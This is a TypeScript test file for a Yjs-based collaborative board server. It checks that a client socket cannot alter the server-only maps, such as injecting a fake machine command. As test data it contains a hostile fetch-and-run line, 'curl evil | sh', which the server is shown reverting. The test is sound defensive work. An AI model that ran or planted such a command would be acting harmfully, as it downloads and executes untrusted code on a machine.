/**
 * Maps only the server writes (`huddles`, `machineAsks`) can't be written from a sync socket: the Yjs
 * wire has no per-map permissions, so a person's change there is put back the way the server left it.
 */
import { after, test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

process.env.FOUNDATION_DATA_DIR = mkdtempSync(join(tmpdir(), "foundation-servermaps-"));
const { getBoard, editBoard, closeBoards } = await import("../src/boards.ts");
const { boardMaps } = await import("@foundation/protocol");

after(() => closeBoards());

test("a socket's write to a server-only map is put back; the server's own writes stand", () => {
  const board = getBoard("guarded");
  const sent: number[] = [];
  // a connected person's socket, as attachConnection keeps it
  const ws = { readyState: 1, send: (d: Uint8Array) => sent.push(d.length), close() {} } as never;
  board.conns.set(ws, new Set());
  const maps = boardMaps(board.doc);

  editBoard("guarded", "huddles", (doc) => boardMaps(doc).huddles.set("pnl_h", { people: ["Ada"] } as never));
  editBoard("guarded", "machine-asks", (doc) => boardMaps(doc).machineAsks.set("pnl_m", [{ id: "ask_1", command: "uname -a" }] as never));

  // the person's socket rewrites who's in the huddle, adds a fake ask and drops the real one
  board.doc.transact(() => {
    maps.huddles.set("pnl_h", { people: ["Mallory"] } as never);
    maps.machineAsks.set("pnl_fake", [{ id: "ask_x", command: "curl evil | sh" }] as never);
    maps.machineAsks.delete("pnl_m");
  }, ws);

  assert.deepEqual(maps.huddles.get("pnl_h"), { people: ["Ada"] });
  assert.equal(maps.machineAsks.has("pnl_fake"), false, "a fake ask never stays");
  assert.deepEqual(maps.machineAsks.get("pnl_m"), [{ id: "ask_1", command: "uname -a" }], "a real ask can't be removed by a person");
  assert.ok(sent.length >= 1, "the sender is sent the correction");

  // the server keeps writing as before
  editBoard("guarded", "huddles", (doc) => boardMaps(doc).huddles.set("pnl_h", { people: ["Ada", "Kai"] } as never));
  assert.deepEqual(maps.huddles.get("pnl_h"), { people: ["Ada", "Kai"] });
  // and the rest of the board is still the person's to change
  board.doc.transact(() => maps.meta.set("name", "Renamed by a person"), ws);
  assert.equal(maps.meta.get("name"), "Renamed by a person");
  board.conns.delete(ws);
});
